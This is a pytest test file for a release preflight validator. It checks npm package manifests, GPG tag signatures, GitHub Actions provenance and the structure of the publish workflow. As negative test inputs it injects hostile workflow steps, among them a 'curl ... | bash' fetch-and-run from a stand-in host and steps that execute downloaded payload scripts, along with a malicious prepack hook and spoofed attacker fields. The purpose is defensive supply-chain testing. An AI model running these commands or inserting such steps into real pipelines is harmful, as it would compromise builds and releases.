from __future__ import annotations

import copy
import hashlib
import json
import os
import re
import shutil
import subprocess
import sys
import textwrap
from pathlib import Path

import pytest

from scripts import release_preflight as preflight


REPO_ROOT = Path(__file__).resolve().parent.parent
PRIMARY_FINGERPRINT = "A" * 40
SIGNING_SUBKEY_FINGERPRINT = "B" * 40
ACTIONS_SHA = "c" * 40
ACTIONS_REPOSITORY = "twiss-io/tess-os"


def _write_json(path: Path, payload: dict) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(payload), encoding="utf-8")


def _metadata_repo(root: Path, version: str = "1.2.3") -> Path:
    _write_json(root / "package.json", {"name": "tess-os", "version": version, "private": False})
    _write_json(
        root / "create-tess" / "package.json",
        {"name": "create-tess", "version": version, "private": False},
    )
    _write_json(
        root / "create-tess" / "package-lock.json",
        {"version": version, "packages": {"": {"version": version}}},
    )
    _write_json(
        root / "gui" / "package.json",
        {"name": "tess-gui", "version": "9.8.7", "private": True},
    )
    _write_json(
        root / "gui" / "package-lock.json",
        {"version": "9.8.7", "packages": {"": {"version": "9.8.7"}}},
    )
    lock = root / ".tess" / "tess.lock"
    lock.parent.mkdir(parents=True, exist_ok=True)
    lock.write_text(
        f"schema: 1\nframework:\n  version: {version}\n  upstream_ref: v{version}\nfiles: {{}}\n",
        encoding="utf-8",
    )
    return root


def _git(repo: Path, *args: str) -> str:
    result = subprocess.run(
        ["git", *args],
        cwd=repo,
        capture_output=True,
        text=True,
        check=True,
    )
    return result.stdout.strip()


def _source_repo(root: Path) -> Path:
    root.mkdir(parents=True)
    _git(root, "init", "-b", "main")
    _git(root, "config", "user.name", "Release Test")
    _git(root, "config", "user.email", "release-test@example.invalid")
    (root / "payload.txt").write_text("one\n", encoding="utf-8")
    _git(root, "add", "payload.txt")
    _git(root, "commit", "-m", "initial")
    _git(root, "tag", "-a", "v1.2.3", "-m", "release")
    _git(root, "update-ref", "refs/remotes/origin/main", "HEAD")
    return root


def _pack_payload(name: str, version: str, paths: set[str]) -> list[dict]:
    return [
        {
            "name": name,
            "version": version,
            "files": [{"path": path} for path in sorted(paths)],
        }
    ]


def _actions_payloads() -> tuple[dict, dict, dict, dict]:
    workflow = {
        "id": 303558258,
        "name": "CI",
        "path": ".github/workflows/ci.yml",
        "state": "active",
    }
    run = {
        "id": 29513113977,
        "name": "CI",
        "path": ".github/workflows/ci.yml",
        "workflow_id": 303558258,
        "run_number": 198,
        "run_attempt": 1,
        "event": "push",
        "status": "completed",
        "conclusion": "success",
        "head_branch": "main",
        "head_sha": ACTIONS_SHA,
        "repository": {"full_name": ACTIONS_REPOSITORY},
        "head_repository": {"full_name": ACTIONS_REPOSITORY},
        "check_suite_id": 79911465632,
    }
    job = {
        "id": 87671299832,
        "run_id": 29513113977,
        "run_attempt": 1,
        "workflow_name": "CI",
        "head_branch": "main",
        "head_sha": ACTIONS_SHA,
        "name": "secret scan (gitleaks)",
        "status": "completed",
        "conclusion": "success",
        "check_run_url": (
            "https://api.github.com/repos/twiss-io/tess-os/check-runs/87671299832"
        ),
    }
    check = {
        "id": 87671299832,
        "name": "secret scan (gitleaks)",
        "head_sha": ACTIONS_SHA,
        "status": "completed",
        "conclusion": "success",
        "external_id": "fdc3defe-2b3f-513d-8e7d-98af863b6beb",
        "details_url": (
            "https://github.com/twiss-io/tess-os/actions/runs/29513113977/job/87671299832"
        ),
        "check_suite": {"id": 79911465632},
        "app": {"id": 15368, "slug": "github-actions", "owner": {"login": "github"}},
    }
    return workflow, {"total_count": 1, "workflow_runs": [run]}, {"total_count": 1, "jobs": [job]}, check


def _validate_actions_payloads(payloads: tuple[dict, dict, dict, dict]) -> dict:
    return preflight.validate_actions_evidence(
        *payloads,
        repository=ACTIONS_REPOSITORY,
        workflow_path=".github/workflows/ci.yml",
        workflow_name="CI",
        event="push",
        branch="main",
        sha=ACTIONS_SHA,
        job_name="secret scan (gitleaks)",
    )


def _copy_workflows(tmp_path: Path) -> Path:
    workflow_dir = tmp_path / ".github" / "workflows"
    shutil.copytree(REPO_ROOT / ".github" / "workflows", workflow_dir)
    return workflow_dir


def _inject_oidc_step(publish: Path, body: str) -> None:
    marker = "    steps:\n      # v4.3.0 commit resolved from the official actions/download-artifact tag."
    replacement = f"    steps:\n{body}\n      # v4.3.0 commit resolved from the official actions/download-artifact tag."
    text = publish.read_text(encoding="utf-8")
    assert marker in text
    publish.write_text(text.replace(marker, replacement, 1), encoding="utf-8")


def _inline_publish_guard() -> str:
    text = (REPO_ROOT / ".github" / "workflows" / "publish-npm.yml").read_text(encoding="utf-8")
    start = text.index("          # BEGIN INLINE_PUBLISH_GUARD")
    end = text.index("          # END INLINE_PUBLISH_GUARD")
    block = text[start:end].splitlines()[1:]
    return textwrap.dedent("\n".join(block))


def test_current_main_metadata_debt_is_explicit_not_hidden() -> None:
    target, issues = preflight.metadata_issues(REPO_ROOT)

    assert target == "0.1.1"
    assert "root package.json version is '0.1.0'; expected '0.1.1'" in issues
    assert all("GUI package must remain private:true" not in issue for issue in issues)


def test_future_unified_release_contract_accepts_aligned_public_versions(tmp_path: Path) -> None:
    repo = _metadata_repo(tmp_path)

    target, issues = preflight.metadata_issues(repo, "v1.2.3")

    assert target == "1.2.3"
    assert issues == []


def test_release_contract_rejects_any_public_version_mismatch(tmp_path: Path) -> None:
    repo = _metadata_repo(tmp_path)
    package = json.loads((repo / "create-tess" / "package.json").read_text(encoding="utf-8"))
    package["version"] = "1.2.2"
    _write_json(repo / "create-tess" / "package.json", package)

    _, issues = preflight.metadata_issues(repo, "v1.2.3")

    assert any("create-tess/package.json version" in issue for issue in issues)


def test_lock_parser_rejects_duplicate_framework_authority(tmp_path: Path) -> None:
    lock = tmp_path / "tess.lock"
    lock.write_text(
        "framework:\n  version: 1.2.3\n  upstream_ref: v1.2.3\n"
        "files: {}\nframework:\n  version: 9.9.9\n  upstream_ref: v9.9.9\n",
        encoding="utf-8",
    )

    with pytest.raises(preflight.PreflightError, match="exactly one"):
        preflight.read_lock_release_fields(lock)


@pytest.mark.parametrize("tag", ["1.2.3", "v1.2", "v1.2.3-rc1", "v01.2.3"])
def test_stable_tag_contract_rejects_noncanonical_tags(tag: str) -> None:
    with pytest.raises(preflight.PreflightError):
        preflight.version_from_tag(tag)


def test_source_accepts_annotated_tag_equal_to_origin_main(tmp_path: Path) -> None:
    repo = _source_repo(tmp_path / "repo")
    head = _git(repo, "rev-parse", "HEAD")

    assert preflight.validate_source(repo, "v1.2.3", expected_sha=head) == head


def test_source_rejects_tagged_commit_behind_origin_main(tmp_path: Path) -> None:
    repo = _source_repo(tmp_path / "repo")
    (repo / "payload.txt").write_text("two\n", encoding="utf-8")
    _git(repo, "add", "payload.txt")
    _git(repo, "commit", "-m", "main advanced")
    _git(repo, "update-ref", "refs/remotes/origin/main", "HEAD")

    with pytest.raises(preflight.PreflightError, match="does not equal protected"):
        preflight.validate_source(repo, "v1.2.3")


def test_source_rejects_lightweight_tag(tmp_path: Path) -> None:
    repo = _source_repo(tmp_path / "repo")
    _git(repo, "tag", "v1.2.4")

    with pytest.raises(preflight.PreflightError, match="annotated tag"):
        preflight.validate_source(repo, "v1.2.4")


def test_validsig_parser_uses_primary_fingerprint_for_signing_subkey() -> None:
    status = (
        "[GNUPG:] VALIDSIG "
        f"{SIGNING_SUBKEY_FINGERPRINT} 2026-07-16 0 0 4 0 1 10 00 {PRIMARY_FINGERPRINT}"
    )

    assert preflight.parse_validsig_primary(status) == PRIMARY_FINGERPRINT


def test_validsig_parser_rejects_multiple_valid_signatures() -> None:
    status = (
        f"[GNUPG:] VALIDSIG {PRIMARY_FINGERPRINT} 1 2 3 4 5 6 7 8 {PRIMARY_FINGERPRINT}\n"
        f"[GNUPG:] VALIDSIG {PRIMARY_FINGERPRINT} 1 2 3 4 5 6 7 8 {PRIMARY_FINGERPRINT}"
    )

    with pytest.raises(preflight.PreflightError, match="exactly one"):
        preflight.parse_validsig_primary(status)


@pytest.mark.parametrize("bad_status", ["EXPKEYSIG", "REVKEYSIG", "BADSIG", "NO_PUBKEY"])
def test_signature_status_rejects_invalid_or_untrusted_states(bad_status: str) -> None:
    status = (
        f"[GNUPG:] {bad_status} unsafe\n"
        f"[GNUPG:] VALIDSIG {PRIMARY_FINGERPRINT} 1 2 3 4 5 6 7 8 {PRIMARY_FINGERPRINT}"
    )

    with pytest.raises(preflight.PreflightError, match="expired, revoked, missing, or invalid"):
        preflight.validate_signature_status(status, PRIMARY_FINGERPRINT)


def test_signature_status_rejects_valid_signature_from_other_primary_key() -> None:
    status = (
        f"[GNUPG:] VALIDSIG {SIGNING_SUBKEY_FINGERPRINT} 1 2 3 4 5 6 7 8 "
        f"{SIGNING_SUBKEY_FINGERPRINT}"
    )

    with pytest.raises(preflight.PreflightError, match="does not match"):
        preflight.validate_signature_status(status, PRIMARY_FINGERPRINT)


def test_fingerprint_rejects_short_or_decorated_values() -> None:
    for value in ("ABC123", "AA:BB", f"fingerprint={PRIMARY_FINGERPRINT}"):
        with pytest.raises(preflight.PreflightError):
            preflight.normalize_fingerprint(value)


def test_root_pack_manifest_is_exact() -> None:
    package = {"name": "tess-os", "version": "1.2.3"}
    preflight.validate_pack_record(
        "root",
        _pack_payload("tess-os", "1.2.3", preflight.ROOT_PACK_FILES),
        package,
    )


def test_root_pack_rejects_unexpected_runtime_payload() -> None:
    package = {"name": "tess-os", "version": "1.2.3"}
    payload = _pack_payload(
        "tess-os",
        "1.2.3",
        preflight.ROOT_PACK_FILES | {".tess/bin/tessctl"},
    )

    with pytest.raises(preflight.PreflightError, match="root metadata pack changed"):
        preflight.validate_pack_record("root", payload, package)


def test_create_tess_pack_rejects_secret_path() -> None:
    paths = set(preflight.PACK_RULES["create-tess"]["required"]) | {"src/.env.production"}
    payload = _pack_payload("create-tess", "1.2.3", paths)

    with pytest.raises(preflight.PreflightError, match="forbidden"):
        preflight.validate_pack_record(
            "create-tess",
            payload,
            {"name": "create-tess", "version": "1.2.3"},
        )


def test_pack_manifest_rejects_parent_traversal_shape() -> None:
    paths = set(preflight.PACK_RULES["create-tess"]["required"]) | {"src/../unexpected.js"}

    with pytest.raises(preflight.PreflightError, match="forbidden"):
        preflight.validate_pack_record(
            "create-tess",
            _pack_payload("create-tess", "1.2.3", paths),
            {"name": "create-tess", "version": "1.2.3"},
        )


def test_package_artifact_disables_malicious_prepack_lifecycle(tmp_path: Path) -> None:
    repo = _metadata_repo(tmp_path / "repo")
    package_dir = repo / "create-tess"
    package = {
        "name": "create-tess",
        "version": "1.2.3",
        "private": False,
        "files": ["bin", "src", "README.md", "LICENSE", "NOTICE"],
        "scripts": {
            "prepack": "node -e \"require('fs').writeFileSync('PREPACK_EXECUTED','bad')\""
        },
    }
    _write_json(package_dir / "package.json", package)
    for relative in (
        "bin/create-tess.mjs",
        "src/index.js",
        "README.md",
        "LICENSE",
        "NOTICE",
    ):
        path = package_dir / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text("safe\n", encoding="utf-8")
    _git(repo, "init", "-b", "main")
    _git(repo, "config", "user.name", "Release Test")
    _git(repo, "config", "user.email", "release-test@example.invalid")
    _git(repo, "add", ".")
    _git(repo, "commit", "-m", "release source")
    _git(repo, "tag", "-a", "v1.2.3", "-m", "release")

    output = tmp_path / "artifact"
    evidence = preflight.build_npm_package_artifact(
        repo,
        "v1.2.3",
        output,
        repository=ACTIONS_REPOSITORY,
        workflow_ref=(
            "twiss-io/tess-os/.github/workflows/publish-npm.yml@refs/heads/main"
        ),
        run_id=10,
        run_attempt=2,
    )

    assert not (package_dir / "PREPACK_EXECUTED").exists()
    assert evidence["package"]["filename"] == "create-tess-1.2.3.tgz"
    assert (output / "create-tess-1.2.3.tgz").is_file()
    assert (output / "release-evidence.json").is_file()
    assert evidence["run_attempt"] == 2


def test_gui_publication_toggle_is_a_release_blocker(tmp_path: Path) -> None:
    repo = _metadata_repo(tmp_path)
    gui = json.loads((repo / "gui" / "package.json").read_text(encoding="utf-8"))
    gui["private"] = False
    _write_json(repo / "gui" / "package.json", gui)

    _, issues = preflight.metadata_issues(repo, "v1.2.3")

    assert "GUI package must remain private:true" in issues


def test_actions_evidence_accepts_only_exact_workflow_run_job_and_app_chain() -> None:
    evidence = _validate_actions_payloads(_actions_payloads())

    assert evidence["workflow_id"] == 303558258
    assert evidence["run_id"] == 29513113977
    assert evidence["run_attempt"] == 1
    assert evidence["job_id"] == 87671299832


@pytest.mark.parametrize(
    ("surface", "path", "value"),
    [
        ("workflow", ("id",), 99),
        ("workflow", ("path",), ".github/workflows/spoof.yml"),
        ("workflow", ("name",), "Spoofed CI"),
        ("workflow", ("state",), "disabled_manually"),
        ("run", ("workflow_id",), 99),
        ("run", ("event",), "workflow_dispatch"),
        ("run", ("run_attempt",), 2),
        ("run", ("head_sha",), "d" * 40),
        ("run", ("head_branch",), "lookalike-main"),
        ("run", ("conclusion",), "failure"),
        ("run", ("repository", "full_name"), "attacker/tess-os"),
        ("job", ("run_id",), 10),
        ("job", ("run_attempt",), 2),
        ("job", ("workflow_name",), "Spoofed CI"),
        ("job", ("head_sha",), "d" * 40),
        ("job", ("name",), "secret scan (gitleaks) spoof"),
        ("job", ("conclusion",), "neutral"),
        ("check", ("check_suite", "id"), 44),
        ("check", ("details_url",), "https://github.com/attacker/spoof"),
        ("check", ("app", "id"), 1),
        ("check", ("app", "slug"), "github-actions-lookalike"),
        ("check", ("app", "owner", "login"), "attacker"),
    ],
)
def test_actions_evidence_rejects_spoofed_provenance_field(
    surface: str, path: tuple[str, ...], value: object
) -> None:
    workflow, runs, jobs, check = copy.deepcopy(_actions_payloads())
    targets = {
        "workflow": workflow,
        "run": runs["workflow_runs"][0],
        "job": jobs["jobs"][0],
        "check": check,
    }
    target = targets[surface]
    for key in path[:-1]:
        target = target[key]
    target[path[-1]] = value

    with pytest.raises(preflight.PreflightError):
        _validate_actions_payloads((workflow, runs, jobs, check))


def test_actions_evidence_rejects_older_success_when_newest_run_failed() -> None:
    workflow, runs, jobs, check = copy.deepcopy(_actions_payloads())
    newer = copy.deepcopy(runs["workflow_runs"][0])
    newer.update({"id": 29513113978, "run_number": 199, "conclusion": "failure"})
    runs["workflow_runs"].append(newer)
    runs["total_count"] = 2

    with pytest.raises(preflight.PreflightError, match="latest workflow run conclusion"):
        _validate_actions_payloads((workflow, runs, jobs, check))


def test_actions_evidence_rejects_duplicate_named_job() -> None:
    workflow, runs, jobs, check = copy.deepcopy(_actions_payloads())
    jobs["jobs"].append(copy.deepcopy(jobs["jobs"][0]))
    jobs["total_count"] = 2

    with pytest.raises(preflight.PreflightError, match="exactly one workflow job"):
        _validate_actions_payloads((workflow, runs, jobs, check))


def test_actions_evidence_rejects_partial_api_page() -> None:
    workflow, runs, jobs, check = copy.deepcopy(_actions_payloads())
    runs["total_count"] = 2

    with pytest.raises(preflight.PreflightError, match="incomplete"):
        _validate_actions_payloads((workflow, runs, jobs, check))


def test_actions_fetch_uses_exact_workflow_run_attempt_job_chain(monkeypatch: pytest.MonkeyPatch) -> None:
    payloads = iter(_actions_payloads())
    urls: list[str] = []

    def fake_get(url: str, token: str) -> object:
        assert token == "test-token"
        urls.append(url)
        return next(payloads)

    monkeypatch.setattr(preflight, "_github_json", fake_get)
    evidence = preflight.fetch_actions_evidence(
        repository=ACTIONS_REPOSITORY,
        workflow_path=".github/workflows/ci.yml",
        workflow_name="CI",
        event="push",
        branch="main",
        sha=ACTIONS_SHA,
        job_name="secret scan (gitleaks)",
        token="test-token",
    )

    assert evidence["job_id"] == 87671299832
    assert urls[0].endswith("/actions/workflows/ci.yml")
    assert "/actions/workflows/303558258/runs?" in urls[1]
    assert "branch=main" in urls[1] and "event=push" in urls[1]
    assert f"head_sha={ACTIONS_SHA}" in urls[1]
    assert urls[2].endswith("/actions/runs/29513113977/attempts/1/jobs?per_page=100")
    assert urls[3].endswith("/check-runs/87671299832")


def test_live_workflows_pass_static_release_boundary_audit() -> None:
    preflight.validate_workflows(REPO_ROOT)


def test_workflow_audit_rejects_mutable_action_reference(tmp_path: Path) -> None:
    workflow_dir = _copy_workflows(tmp_path)
    ci = workflow_dir / "ci.yml"
    ci.write_text(
        ci.read_text(encoding="utf-8").replace(
            "actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5",
            "actions/checkout@v4",
            1,
        ),
        encoding="utf-8",
    )

    with pytest.raises(preflight.PreflightError, match="not pinned"):
        preflight.validate_workflows(tmp_path)


def test_workflow_audit_rejects_wrong_pinned_action_commit(tmp_path: Path) -> None:
    workflow_dir = _copy_workflows(tmp_path)
    ci = workflow_dir / "ci.yml"
    ci.write_text(
        ci.read_text(encoding="utf-8").replace(
            "actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065",
            f"actions/setup-python@{'f' * 40}",
            1,
        ),
        encoding="utf-8",
    )

    with pytest.raises(preflight.PreflightError, match="reviewed commit"):
        preflight.validate_workflows(tmp_path)


def test_workflow_audit_rejects_quoted_uses_key_bypass(tmp_path: Path) -> None:
    workflow_dir = _copy_workflows(tmp_path)
    ci = workflow_dir / "ci.yml"
    ci.write_text(
        ci.read_text(encoding="utf-8").replace(
            "uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5",
            '\"uses\": attacker/action@v1',
            1,
        ),
        encoding="utf-8",
    )

    with pytest.raises(preflight.PreflightError, match="canonical unquoted"):
        preflight.validate_workflows(tmp_path)


def test_workflow_audit_rejects_duplicate_top_level_jobs_mapping(tmp_path: Path) -> None:
    workflow_dir = _copy_workflows(tmp_path)
    ci = workflow_dir / "ci.yml"
    ci.write_text(
        ci.read_text(encoding="utf-8") + "\njobs:\n  attacker:\n    runs-on: ubuntu-latest\n",
        encoding="utf-8",
    )

    with pytest.raises(preflight.PreflightError, match="exactly one top-level jobs"):
        preflight.validate_workflows(tmp_path)


def test_workflow_audit_rejects_wrong_gitleaks_digest(tmp_path: Path) -> None:
    workflow_dir = _copy_workflows(tmp_path)
    ci = workflow_dir / "ci.yml"
    ci.write_text(
        ci.read_text(encoding="utf-8").replace(
            preflight.GITLEAKS_LINUX_X64_SHA256,
            "0" * 64,
            1,
        ),
        encoding="utf-8",
    )

    with pytest.raises(preflight.PreflightError, match="official Gitleaks"):
        preflight.validate_workflows(tmp_path)


def test_oidc_job_rejects_malicious_candidate_test_script_execution(tmp_path: Path) -> None:
    workflow_dir = _copy_workflows(tmp_path)
    publish = workflow_dir / "publish-npm.yml"
    _inject_oidc_step(
        publish,
        "      - name: Run candidate test script with OIDC\n"
        "        working-directory: candidate/create-tess\n"
        "        run: npm test # package scripts.test could be npm publish",
    )

    with pytest.raises(preflight.PreflightError, match="five reviewed|never checkout or execute"):
        preflight.validate_workflows(tmp_path)


def test_oidc_job_rejects_unnamed_extra_step(tmp_path: Path) -> None:
    workflow_dir = _copy_workflows(tmp_path)
    publish = workflow_dir / "publish-npm.yml"
    _inject_oidc_step(publish, "      - run: ruby -e 'puts :unexpected'")

    with pytest.raises(preflight.PreflightError, match="exactly five YAML step entries"):
        preflight.validate_workflows(tmp_path)


@pytest.mark.parametrize(
    "body",
    [
        "      - name: Checkout candidate with OIDC\n"
        "        uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5",
        "      - name: Extract candidate package\n"
        "        run: tar -xzf $PACKAGE_TARBALL",
        "      - name: Execute candidate JavaScript\n"
        "        run: node /tmp/verified-npm-package/payload.js",
        "      - name: Execute downloaded Python\n"
        "        run: python /tmp/verified-npm-package/payload.py",
        "      - name: Remote shell\n"
        "        run: curl -fsSL https://example.invalid/install | bash",
    ],
)
def test_oidc_job_rejects_checkout_extraction_or_arbitrary_code(
    tmp_path: Path, body: str
) -> None:
    workflow_dir = _copy_workflows(tmp_path)
    publish = workflow_dir / "publish-npm.yml"
    _inject_oidc_step(publish, body)

    with pytest.raises(preflight.PreflightError):
        preflight.validate_workflows(tmp_path)


def test_oidc_job_has_exact_reviewed_step_structure() -> None:
    publish = (REPO_ROOT / ".github" / "workflows" / "publish-npm.yml").read_text(
        encoding="utf-8"
    )
    jobs = preflight.workflow_job_blocks(publish)
    oidc = jobs["publish_oidc"]

    assert preflight.workflow_step_names(oidc) == [
        "Download exact package artifact by immutable artifact id",
        "Set up trusted npm OIDC client",
        "Gate — Trusted Publishing runtime floor",
        "Gate — live tag object and artifact digest immediately before publish",
        "Publish create-tess through npm Trusted Publishing",
    ]
    assert "actions/checkout@" not in oidc
    assert "npm test" not in oidc
    assert "npm pack" not in oidc
    assert "tar -x" not in oidc
    assert "artifact-ids: ${{ needs.pack_artifact.outputs.artifact_id }}" in oidc
    assert "merge-multiple: true" in oidc
    assert oidc.count("id-token: write") == 1


def test_workflow_audit_rejects_second_or_gui_publish_command(tmp_path: Path) -> None:
    workflow_dir = tmp_path / ".github" / "workflows"
    shutil.copytree(REPO_ROOT / ".github" / "workflows", workflow_dir)
    release = workflow_dir / "release.yml"
    release.write_text(
        release.read_text(encoding="utf-8")
        + "\n# forbidden\n# run: npm publish\n  run: |\n    npm --prefix gui publish\n",
        encoding="utf-8",
    )

    with pytest.raises(preflight.PreflightError, match="exactly one npm publish"):
        preflight.validate_workflows(tmp_path)


def test_workflow_audit_rejects_automatic_npm_publish_trigger(tmp_path: Path) -> None:
    workflow_dir = tmp_path / ".github" / "workflows"
    shutil.copytree(REPO_ROOT / ".github" / "workflows", workflow_dir)
    publish = workflow_dir / "publish-npm.yml"
    publish.write_text(
        publish.read_text(encoding="utf-8").replace(
            "on:\n  workflow_dispatch:",
            "on:\n  push:\n    tags: ['create-tess-v*']\n  workflow_dispatch:",
            1,
        ),
        encoding="utf-8",
    )

    with pytest.raises(preflight.PreflightError, match="explicit manual"):
        preflight.validate_workflows(tmp_path)


def test_workflow_audit_rejects_tag_push_release_authority(tmp_path: Path) -> None:
    workflow_dir = tmp_path / ".github" / "workflows"
    shutil.copytree(REPO_ROOT / ".github" / "workflows", workflow_dir)
    release = workflow_dir / "release.yml"
    release.write_text(
        release.read_text(encoding="utf-8").replace(
            "on:\n  pull_request:",
            "on:\n  push:\n    tags: ['v*']\n  pull_request:",
            1,
        ),
        encoding="utf-8",
    )

    with pytest.raises(preflight.PreflightError, match="tag pushes must be inert"):
        preflight.validate_workflows(tmp_path)


def test_workflow_audit_rejects_candidate_controlled_signer_gate(tmp_path: Path) -> None:
    workflow_dir = tmp_path / ".github" / "workflows"
    shutil.copytree(REPO_ROOT / ".github" / "workflows", workflow_dir)
    release = workflow_dir / "release.yml"
    release.write_text(
        release.read_text(encoding="utf-8").replace(
            "control/scripts/release_preflight.py signer",
            "candidate/scripts/release_preflight.py signer",
            1,
        ),
        encoding="utf-8",
    )

    with pytest.raises(preflight.PreflightError, match="trusted main control"):
        preflight.validate_workflows(tmp_path)


def test_rehearsal_has_no_release_environment_or_release_secrets() -> None:
    workflow = (REPO_ROOT / ".github" / "workflows" / "release.yml").read_text(encoding="utf-8")
    rehearsal, production = workflow.split("  release_preflight:\n", 1)
    preflight_job, publish_job = production.split("  publish_release:\n", 1)

    assert "pull_request_target" not in workflow
    assert "secrets." not in rehearsal
    assert "environment: release" not in rehearsal
    assert "contents: write" not in rehearsal
    assert "environment: release" in preflight_job
    assert "contents: write" not in preflight_job
    assert "path: control" in preflight_job and "path: candidate" in preflight_job
    assert preflight_job.index("TESS_RELEASE_SIGNER_FINGERPRINT") < preflight_job.index("GH_TOKEN")
    assert "candidate/scripts/release_preflight.py" not in preflight_job
    assert "contents: write" in publish_job
    assert "EXPECTED_TAG_OBJECT" in publish_job
    assert "release tag moved after signed preflight" in publish_job
    assert "candidate/scripts" not in publish_job
    assert not re.search(r"^\s*run:\s*npm\b.*\bpublish\b", production, re.MULTILINE)


def test_live_tag_ref_rejects_moved_or_lightweight_tag() -> None:
    expected = "a" * 40
    with pytest.raises(preflight.PreflightError, match="moved"):
        preflight.validate_live_tag_ref(
            {"ref": "refs/tags/v1.2.3", "object": {"type": "tag", "sha": "b" * 40}},
            "v1.2.3",
            expected,
        )
    with pytest.raises(preflight.PreflightError, match="annotated"):
        preflight.validate_live_tag_ref(
            {"ref": "refs/tags/v1.2.3", "object": {"type": "commit", "sha": expected}},
            "v1.2.3",
            expected,
        )


def _run_inline_guard(tmp_path: Path, mutation: str | None = None) -> subprocess.CompletedProcess[str]:
    version = "1.2.3"
    source_sha = "c" * 40
    tag_object_sha = "a" * 40
    tarball_name = f"create-tess-{version}.tgz"
    package_dir = tmp_path / "verified-npm-package"
    package_dir.mkdir()
    tarball = package_dir / tarball_name
    tarball.write_bytes(b"trusted package bytes")
    tarball_sha = hashlib.sha256(tarball.read_bytes()).hexdigest()
    evidence = {
        "schema": 1,
        "repository": ACTIONS_REPOSITORY,
        "workflow_ref": (
            "twiss-io/tess-os/.github/workflows/publish-npm.yml@refs/heads/main"
        ),
        "run_id": 50,
        "run_attempt": 2,
        "release_tag": "v1.2.3",
        "source_sha": source_sha,
        "tag_object_sha": tag_object_sha,
        "package": {
            "name": "create-tess",
            "version": version,
            "filename": tarball_name,
            "sha256": tarball_sha,
            "files": sorted(preflight.PACK_RULES["create-tess"]["required"]),
        },
    }
    artifact = {
        "id": 77,
        "name": "create-tess-package-50-2",
        "expired": False,
        "digest": f"sha256:{'d' * 64}",
        "workflow_run": {"id": 50, "head_branch": "main", "head_sha": source_sha},
    }
    tag_ref = {
        "ref": "refs/tags/v1.2.3",
        "object": {"type": "tag", "sha": tag_object_sha},
    }
    env = {
        **os.environ,
        "EXPECTED_ARTIFACT_ID": "77",
        "EXPECTED_ARTIFACT_DIGEST": f"sha256:{'d' * 64}",
        "EXPECTED_ARTIFACT_NAME": "create-tess-package-50-2",
        "EXPECTED_REPOSITORY": ACTIONS_REPOSITORY,
        "EXPECTED_RUN_ID": "50",
        "EXPECTED_RUN_ATTEMPT": "2",
        "EXPECTED_HEAD_SHA": source_sha,
        "EXPECTED_TAG": "v1.2.3",
        "EXPECTED_TAG_OBJECT": tag_object_sha,
        "EXPECTED_VERSION": version,
        "EXPECTED_WORKFLOW_REF": (
            "twiss-io/tess-os/.github/workflows/publish-npm.yml@refs/heads/main"
        ),
        "EXPECTED_TARBALL_SHA256": tarball_sha,
    }
    if mutation == "artifact_digest":
        artifact["digest"] = f"sha256:{'e' * 64}"
    elif mutation == "tarball_digest":
        tarball.write_bytes(b"swapped package bytes")
    elif mutation == "moved_tag":
        tag_ref["object"]["sha"] = "b" * 40
    elif mutation == "run_attempt":
        evidence["run_attempt"] = 3
    elif mutation == "workflow_ref":
        evidence["workflow_ref"] = (
            "twiss-io/tess-os/.github/workflows/spoof.yml@refs/heads/main"
        )
    elif mutation == "unexpected_file":
        (package_dir / "payload.js").write_text("malicious\n", encoding="utf-8")
    elif mutation is not None:
        raise AssertionError(f"unknown mutation: {mutation}")

    artifact_path = tmp_path / "artifact.json"
    evidence_path = package_dir / "release-evidence.json"
    tag_path = tmp_path / "tag.json"
    _write_json(artifact_path, artifact)
    _write_json(evidence_path, evidence)
    _write_json(tag_path, tag_ref)
    return subprocess.run(
        [
            sys.executable,
            "-c",
            _inline_publish_guard(),
            str(artifact_path),
            str(evidence_path),
            str(tag_path),
            str(tarball),
        ],
        env=env,
        capture_output=True,
        text=True,
        check=False,
    )


def test_inline_oidc_guard_accepts_exact_artifact_and_live_tag(tmp_path: Path) -> None:
    result = _run_inline_guard(tmp_path)

    assert result.returncode == 0, result.stderr
    assert "identities are exact" in result.stdout


@pytest.mark.parametrize(
    "mutation",
    [
        "artifact_digest",
        "tarball_digest",
        "moved_tag",
        "run_attempt",
        "workflow_ref",
        "unexpected_file",
    ],
)
def test_inline_oidc_guard_rejects_swapped_artifact_or_spoofed_envelope(
    tmp_path: Path, mutation: str
) -> None:
    result = _run_inline_guard(tmp_path, mutation)

    assert result.returncode != 0
